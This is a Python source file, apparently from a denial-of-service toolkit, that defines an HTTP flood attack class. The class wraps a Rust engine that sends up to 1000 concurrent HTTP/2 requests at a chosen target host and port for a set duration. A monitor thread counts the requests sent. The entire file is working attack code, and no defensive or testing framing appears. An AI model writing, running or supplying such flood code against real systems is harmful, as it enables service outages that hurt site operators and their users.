import time
import threading
from .base import AttackBase
from core.http_rust_engine import RustHttpFloodWrapper, RUST_HTTP_AVAILABLE


class RustHttpFlood(AttackBase):
    """High-performance HTTP flood using Rust + reqwest."""

    def __init__(
        self,
        *args,
        concurrency: int = 1000,
        http2: bool = True,
        disable_pooling: bool = False,
        **kwargs,
    ):
        super().__init__(*args, **kwargs)
        if not RUST_HTTP_AVAILABLE:
            raise RuntimeError("Rust HTTP engine not available.")
        self.url = f"http://{self.target}:{self.port}/"
        self.concurrency = concurrency
        self.http2 = http2
        self.disable_pooling = disable_pooling
        self.engine = RustHttpFloodWrapper(
            self.url,
            concurrency=concurrency,
            http2=http2,
            disable_pooling=disable_pooling,
        )
        self._monitor_thread = None
        self._monitor_running = False

    def start(self):
        self.stats["start_time"] = time.time()
        self.engine.start()
        self._start_monitor()
        time.sleep(self.duration)
        self._stop_monitor()
        self.engine.stop()
        self.stats["end_time"] = time.time()
        self.stats["requests"] = self.engine.get_requests_sent()
        return self.stats

    def _start_monitor(self):
        self._monitor_running = True
        self._monitor_thread = threading.Thread(target=self._monitor_loop)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()

    def _stop_monitor(self):
        self._monitor_running = False
        if self._monitor_thread:
            self._monitor_thread.join(timeout=1)

    def _monitor_loop(self):
        while self._monitor_running:
            time.sleep(1.0)
            count = self.engine.get_requests_sent()
            with self.lock:
                self.stats["requests"] = count
                self.stats["bytes_sent"] = count * 200

    def worker(self) -> int:
        return 0